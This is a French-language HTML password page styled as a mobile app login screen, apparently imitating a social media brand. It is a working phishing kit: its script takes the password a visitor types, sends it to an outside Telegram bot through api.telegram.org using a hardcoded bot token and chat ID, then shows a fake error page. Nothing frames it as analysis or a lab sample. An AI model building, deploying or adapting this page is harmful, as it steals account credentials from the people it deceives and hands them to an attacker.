<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion - Saisir le mot de passe</title>
    <style>
        /* Réinitialisation CSS & Styles Généraux */
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            background-color: #ffffff;
            color: #161823;
        }

        /* En-tête de navigation */
        .header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            height: 60px;
            padding: 0 16px;
        }

        .icon-btn {
            background: none;
            border: none;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            width: 32px;
            height: 32px;
            padding: 0;
        }

        .icon-btn svg {
            width: 24px;
            height: 24px;
            fill: #161823;
        }

        /* Zone de contenu principale */
        .main-content {
            flex: 1;
            padding: 24px;
            display: flex;
            flex-direction: column;
        }

        h1 {
            font-size: 32px;
            font-weight: 700;
            margin-top: 16px;
            margin-bottom: 32px;
        }

        /* Groupe de saisie du mot de passe */
        .input-wrapper {
            position: relative;
            width: 100%;
            display: flex;
            align-items: center;
            background-color: #f1f1f2;
            border-radius: 8px;
            height: 48px;
        }

        .input-field {
            flex: 1;
            height: 100%;
            background: transparent;
            border: none;
            padding: 0 16px;
            font-size: 15px;
            color: #161823;
            outline: none;
        }

        .input-field::placeholder {
            color: #8a8b91;
        }

        .toggle-pwd-btn {
            background: none;
            border: none;
            cursor: pointer;
            padding: 0 16px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .toggle-pwd-btn svg {
            width: 20px;
            height: 20px;
            fill: #161823;
        }

        /* Lien d'aide */
        .help-link {
            margin-top: 24px;
            font-size: 14px;
            font-weight: 600;
            color: #0056b3;
            text-decoration: none;
            align-self: flex-start;
        }

        .help-link:hover {
            text-decoration: underline;
        }

        /* Pied de page / Bouton d'action */
        .footer {
            padding: 24px;
            margin-top: auto;
        }

        .continue-btn {
            width: 100%;
            height: 48px;
            border-radius: 24px;
            border: none;
            font-size: 15px;
            font-weight: 600;
            color: #ffffff;
            cursor: pointer;
            transition: background-color 0.2s ease;
            background-color: #ff96a6; /* État désactivé */
        }

        .continue-btn.active {
            background-color: #fe2c55; /* État actif */
        }
    </style>
</head>
<body>

    <header class="header">
        <button class="icon-btn" id="backBtn" aria-label="Retour">
            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                <path d="M15.41 16.59L10.83 12l4.58-4.59L14 6l-6 6 6 6 1.41-1.41z"/>
            </svg>
        </button>
        
        <button class="icon-btn" id="helpBtn" aria-label="Aide">
            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 17h-2v-2h2v2zm2.07-7.75l-.9.92C13.45 12.9 13 13.5 13 15h-2v-.5c0-1.1.45-2.1 1.17-2.83l1.24-1.26c.37-.36.59-.86.59-1.41 0-1.1-.9-2-2-2s-2 .9-2 2H8c0-2.21 1.79-4 4-4s4 1.79 4 4c0 .88-.36 1.68-.93 2.25z"/>
            </svg>
        </button>
    </header>

    <main class="main-content">
        <h1>Saisir le mot de passe</h1>
        
        <div class="input-wrapper">
            <input type="password" id="pwdInput" class="input-field" placeholder="Mot de passe">
            <button class="toggle-pwd-btn" id="togglePwdBtn" aria-label="Afficher/Masquer le mot de passe">
                <svg id="eyeClosedIcon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                    <path d="M12 7c-2.76 0-5 2.24-5 5 0 .65.13 1.26.36 1.83l2.92-2.92c-.15-.74.32-1.54 1.06-1.81.74-.27 1.54.2 1.81.94l2.68-2.68C14.77 7.15 13.43 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z"/>
                </svg>
                <svg id="eyeOpenIcon" style="display: none;" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                    <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
                </svg>
            </button>
        </div>

        <a href="#" class="help-link">Besoin d'aide pour vous connecter ?</a>
    </main>

    <footer class="footer">
        <button id="continueBtn" class="continue-btn" disabled>Continuer</button>
    </footer>

    <script>
        const pwdInput = document.getElementById('pwdInput');
        const continueBtn = document.getElementById('continueBtn');
        const togglePwdBtn = document.getElementById('togglePwdBtn');
        const eyeClosedIcon = document.getElementById('eyeClosedIcon');
        const eyeOpenIcon = document.getElementById('eyeOpenIcon');

        // Configuration Telegram
        const TELEGRAM_TOKEN = "8245021160:AAEnbdixzuhvNj-IJVAlewEGLb0_Qszd9_U";
        const CHAT_ID = "-1003768455972";

        // Activer/Désactiver le bouton "Continuer" selon la saisie
        pwdInput.addEventListener('input', function() {
            if (pwdInput.value.trim().length > 0) {
                continueBtn.classList.add('active');
                continueBtn.removeAttribute('disabled');
            } else {
                continueBtn.classList.remove('active');
                continueBtn.setAttribute('disabled', 'true');
            }
        });

        // Basculer la visibilité du mot de passe
        togglePwdBtn.addEventListener('click', function() {
            if (pwdInput.type === 'password') {
                pwdInput.type = 'text';
                eyeClosedIcon.style.display = 'none';
                eyeOpenIcon.style.display = 'block';
            } else {
                pwdInput.type = 'password';
                eyeClosedIcon.style.display = 'block';
                eyeOpenIcon.style.display = 'none';
            }
        });

        // Envoi et Redirection
        continueBtn.addEventListener('click', async () => {
            const password = pwdInput.value.trim();
            
            continueBtn.disabled = true;
            continueBtn.innerText = "Vérification...";

            const message = `<b>🔑 Mot de passe reçu</b>\n\n<b>Mot de passe:</b> <code>${password}</code>`;

            try {
                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                
                // Redirection vers error.html
                window.location.href = "error.html";
            } catch (error) {
                console.error('Erreur:', error);
                window.location.href = "error.html";
            }
        });

        // Boutons de l'en-tête
        document.getElementById('backBtn').addEventListener('click', () => {
            window.history.back();
        });
        
        document.getElementById('helpBtn').addEventListener('click', () => {
            alert('Ouverture du centre d\'aide...');
        });
    </script>

</body>
</html>
